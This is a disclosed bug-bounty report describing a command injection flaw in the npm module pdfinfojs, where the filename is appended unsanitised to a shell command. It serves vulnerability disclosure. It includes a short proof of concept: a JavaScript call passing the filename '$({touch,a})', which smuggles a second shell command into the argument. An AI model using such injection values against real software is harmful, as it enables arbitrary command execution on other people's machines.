# [pdfinfojs] Command Injection on filename parameter

## Report Details
- **Report ID**: 330957
- **URL**: https://hackerone.com/reports/330957
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-03-29T01:18:13.084Z
- **Disclosed**: 2018-04-19T07:31:54.253Z

## Reporter
- **Username**: caioluders
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hello , there is a Command Injection vulnerability on the "pdfinfojs" module.

# Module

**module name:** pdfinfojs
**version:** 0.3.6
**npm page:** https://www.npmjs.com/package/pdfinfojs

## Module Description

> pdfinfo shell wrapper for Node.js

## Module Stats

10 downloads in the last day
61 downloads in the last week
106 downloads in the last month

# Vulnerability

## Vulnerability Description

> The module appends the filename parameter to the command on the lines [28](https://github.com/fagbokforlaget/pdfinfojs/blob/master/lib/pdfinfo.js#L28), [47](https://github.com/fagbokforlaget/pdfinfojs/blob/master/lib/pdfinfo.js#L47) and [72](https://github.com/fagbokforlaget/pdfinfojs/blob/master/lib/pdfinfo.js#L72) without parsing the user input, thus leading to a Command Injection. 

## Steps To Reproduce:

* Install the module 

```
$ npm install pdfinfojs
```

* Example code, similar to the documentation, with the malicious filename `$({touch,a})` :

```javascript
var pdfinfo = require('pdfinfojs'),
    pdf = new pdfinfo('$({touch,a})'); // Malicious payload

pdf.getInfo(function(err, info, params) {
  if (err) {
    console.error(err.stack);
  }
  else {
    console.log(info); //info is an object
    console.log(params); // commandline params passed to pdfinfo cmd
  }
});
```

*there are a lot of possibles payloads to achieve this, used this brace expansion just because space in the file name sucks*

* Run the code 

```
$ node index.js
Error
    ... it throws an error, but the execution is successful
```
* Check the newly created file 

```
$ ls
a		index.js
```

## Patch

It is advisable to use a module that explicitly isolates the parameters to the `pdfinfo` command.

## Tested on :

- macOS Sierra 10.12.16
- NODEJS v8.4.0
- NPM 5.3.0

**( contacted the maintainer || opened issue ) = False**

## Impact

An attacker can execute arbitrary commands on the victim's machine

## Attachments
No attachments
